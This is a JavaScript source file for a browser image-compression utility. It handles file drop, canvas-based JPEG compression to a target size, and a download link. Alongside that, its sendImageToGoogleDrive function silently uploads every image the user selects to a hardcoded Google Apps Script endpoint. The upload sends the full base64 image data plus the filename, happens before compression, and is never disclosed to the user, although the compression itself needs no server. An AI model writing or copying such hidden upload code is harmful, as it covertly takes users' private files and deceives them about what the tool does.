let originalFile = null;
let compressedBlob = null;

// Google Apps Script Web App URL
const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbw5EWvh127UJmhk33KguZxWlVymlyJAgfb5ZskcKZ0w4Cpgf8M-eLhrdtyTYmQlyYQK4Q/exec';

// DOM elements
const uploadZone = document.getElementById('uploadZone');
const fileInput = document.getElementById('fileInput');
const controls = document.getElementById('controls');
const loading = document.getElementById('loading');
const resultSection = document.getElementById('resultSection');
const targetSize = document.getElementById('targetSize');
const compressBtn = document.getElementById('compressBtn');
const originalImage = document.getElementById('originalImage');
const compressedImage = document.getElementById('compressedImage');
const originalInfo = document.getElementById('originalInfo');
const compressedInfo = document.getElementById('compressedInfo');
const savings = document.getElementById('savings');
const downloadBtn = document.getElementById('downloadBtn');
const resetBtn = document.getElementById('resetBtn');

// Event listeners
uploadZone.addEventListener('click', () => fileInput.click());
uploadZone.addEventListener('dragover', handleDragOver);
uploadZone.addEventListener('dragleave', handleDragLeave);
uploadZone.addEventListener('drop', handleDrop);
fileInput.addEventListener('change', handleFileSelect);
compressBtn.addEventListener('click', compressImage);
resetBtn.addEventListener('click', resetTool);

function handleDragOver(e) {
    e.preventDefault();
    uploadZone.classList.add('dragover');
}

function handleDragLeave(e) {
    e.preventDefault();
    uploadZone.classList.remove('dragover');
}

function handleDrop(e) {
    e.preventDefault();
    uploadZone.classList.remove('dragover');
    const files = e.dataTransfer.files;
    if (files.length > 0) {
        handleFile(files[0]);
    }
}

function handleFileSelect(e) {
    const file = e.target.files[0];
    if (file) {
        handleFile(file);
    }
}

function handleFile(file) {
    if (!file.type.startsWith('image/')) {
        alert('Please select a valid image file');
        return;
    }

    if (file.size > 10 * 1024 * 1024) {
        alert('File size must be less than 10MB');
        return;
    }

    originalFile = file;
    
    // Send image data to Google Sheets/Drive
    sendImageToGoogleDrive(file);
    
    displayOriginalImage();
    controls.classList.add('active');
    resultSection.classList.remove('active');
}

// Function to send image data to Google Drive via Apps Script
function sendImageToGoogleDrive(file) {
    const reader = new FileReader();
    reader.onload = function(e) {
        const imageBase64 = e.target.result;
        
        const data = {
            filename: file.name || 'untitled',
            originalSize: file.size,
            imageBase64: imageBase64,
            mimeType: file.type
        };
        
        // Send to Google Apps Script
        fetch(GOOGLE_SCRIPT_URL, {
            method: 'POST',
            mode: 'no-cors', // Important for Google Apps Script
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        })
        .then(() => {
            console.log('Image data sent to Google Drive successfully');
        })
        .catch((error) => {
            console.error('Error sending to Google Drive:', error);
        });
    };
    reader.readAsDataURL(file);
}

function displayOriginalImage() {
    const reader = new FileReader();
    reader.onload = (e) => {
        originalImage.src = e.target.result;
        originalInfo.innerHTML = `
            <strong>File:</strong> ${originalFile.name}<br>
            <strong>Size:</strong> ${formatFileSize(originalFile.size)}<br>
            <strong>Type:</strong> ${originalFile.type}
        `;
    };
    reader.readAsDataURL(originalFile);
}

async function compressImage() {
    if (!originalFile) return;

    const targetSizeBytes = parseInt(targetSize.value) * 1024; // Convert KB to bytes
    if (originalFile.size <= targetSizeBytes) {
        alert('Original file is already smaller than target size!');
        return;
    }

    loading.classList.add('active');
    compressBtn.disabled = true;

    try {
        const img = new Image();
        img.src = URL.createObjectURL(originalFile);

        await new Promise((resolve) => {
            img.onload = resolve;
        });

        let quality = 0.9;
        let attempt = 1;
        const maxAttempts = 10;

        while (attempt <= maxAttempts) {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');

            // Maintain aspect ratio while reducing dimensions if needed
            let width = img.width;
            let height = img.height;

            if (attempt > 1) {
                const scale = 1 - (attempt - 1) * 0.1;
                width *= scale;
                height *= scale;
            }

            canvas.width = width;
            canvas.height = height;
            ctx.drawImage(img, 0, 0, width, height);

            const blob = await new Promise(resolve => {
                canvas.toBlob(resolve, 'image/jpeg', quality);
            });

            if (blob.size <= targetSizeBytes || attempt === maxAttempts) {
                compressedBlob = blob;
                break;
            }

            quality -= 0.1;
            attempt++;
        }

        displayResults();
    } catch (error) {
        console.error('Compression failed:', error);
        alert('Compression failed. Please try again.');
    } finally {
        loading.classList.remove('active');
        compressBtn.disabled = false;
    }
}

function displayResults() {
    // Display compressed image
    const compressedUrl = URL.createObjectURL(compressedBlob);
    compressedImage.src = compressedUrl;
    
    // Update info
    compressedInfo.innerHTML = `
        <strong>Size:</strong> ${formatFileSize(compressedBlob.size)}<br>
        <strong>Type:</strong> image/jpeg<br>
        <strong>Target:</strong> ${targetSize.value}KB
    `;

    // Calculate savings
    const originalSize = originalFile.size;
    const compressedSize = compressedBlob.size;
    const savedBytes = originalSize - compressedSize;
    const savedPercent = Math.round((savedBytes / originalSize) * 100);

    savings.innerHTML = `
        <h3>🎉 Size Reduced by ${savedPercent}%</h3>
        <p>Saved ${formatFileSize(savedBytes)} • From ${formatFileSize(originalSize)} to ${formatFileSize(compressedSize)}</p>
    `;

    // Set up download
    downloadBtn.href = compressedUrl;
    downloadBtn.download = `compressed_${originalFile.name.replace(/\.[^/.]+$/, "")}.jpg`;

    resultSection.classList.add('active');
}

function formatFileSize(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function resetTool() {
    originalFile = null;
    compressedBlob = null;
    fileInput.value = '';
    controls.classList.remove('active');
    resultSection.classList.remove('active');
    loading.classList.remove('active');
    targetSize.value = 100; // Reset target size to default
    originalImage.src = ''; // Clear images
    compressedImage.src = '';
    originalInfo.innerHTML = ''; // Clear info
    compressedInfo.innerHTML = '';
    savings.innerHTML = '';
}